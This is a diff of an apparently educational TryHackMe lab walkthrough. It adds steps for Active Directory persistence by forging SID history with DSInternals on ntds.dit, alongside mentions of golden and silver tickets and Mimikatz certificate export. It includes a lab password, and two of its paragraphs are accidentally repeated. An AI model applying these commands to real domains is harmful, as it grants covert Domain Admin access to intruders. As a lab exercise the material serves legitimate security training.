@@ -121,7 +121,7 @@ We can verify that the golden ticket is working by running the dir command again
 dir \\thmdc.za.tryhackme.loc\c$\
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (5).png" alt=""><figcaption></figcaption></figure>
 
 Even if the golden ticket has an incredibly long time, the blue team can still defend against this by simply rotating the KRBTGT password twice. If we really want to dig in our roots, we want to generate silver tickets, which are less likely to be discovered and significantly harder to defend against since the passwords of every machine account must be rotated. We can use the following Mimikatz command to generate a silver ticket.
 
@@ -173,7 +173,7 @@ crypto::cng
 crypto::certificates /systemstore:local_machine /export
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim(cmd) - THMDC**
 
@@ -284,3 +284,71 @@ kerberos::ptt administrator.kirbi
 ```
 dir \\THMDC.za.tryhackme.loc\c$\
 ```
+
+## Persistence through SID History
+
+**Kali**
+
+```
+ssh Administrator@THMCDC.za.tryhackme.loc
+Password: tryhackmewouldnotguess1@
+```
+
+Get an SSH session on THMDC using the Administrator credentials for this next part. Before we forge SID history, let's just first get some information regarding the SIDs. Firstly, let's make sure that our low-privilege user does not currently have any information in their SID history:
+
+**Victim(cmd) - THMDC**
+
+```
+powershell -ep bypass
+Get-ADUser $yourAdUsername -properties sidhistory,memberof
+```
+
+This confirms that our user does not currently have any SID History set. Let's get the SID of the Domain Admins group since this is the group we want to add to our SID History.
+
+**Victim(powershell) - THMDC**
+
+```
+Get-ADGroup "Domain Admins"
+```
+
+<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+
+We could use something like Mimikatz to add SID history. However, the latest version of Mimikatz has a flaw that does not allow it to patch LSASS to update SID history. Hence we need to use something else. In this case, we will use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file, the AD database where all information is stored.
+
+**Victim(powershell) - THMDC**
+
+```
+Stop-Service -Name ntds -force 
+
+Add-ADDBSidHistory -SamAccountName $UsernameOfOurLow-privelegedADAccount -SidHistory $SIDtoAddToSIDHistory -DatabasePath C:\Windows\NTDS\ntds.dit 
+
+Start-Service -Name ntds  
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+The NTDS database is locked when the NTDS service is running. In order to patch our SID history, we must first stop the service. You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore.
+
+After these steps have been performed, let's SSH into THMWRK1 with our low-privileged credentials and verify that the SID history was added and that we now have Domain Admin privileges.
+
+**Kali**
+
+```
+ssh $lowUser@thmwrk1.za.tryhackme.loc
+```
+
+The NTDS database is locked when the NTDS service is running. In order to patch our SID history, we must first stop the service. You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore.
+
+After these steps have been performed, let's SSH into THMWRK1 with our low-privileged credentials and verify that the SID history was added and that we now have Domain Admin privileges.
+
+**Victim(cmd) - THMWRK1**
+
+```
+powershell -ep bypass
+Get-ADUser $lowUser -Properties sidhistory 
+dir \\thmdc.za.tryhackme.loc\c$ 
+```
+
+<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
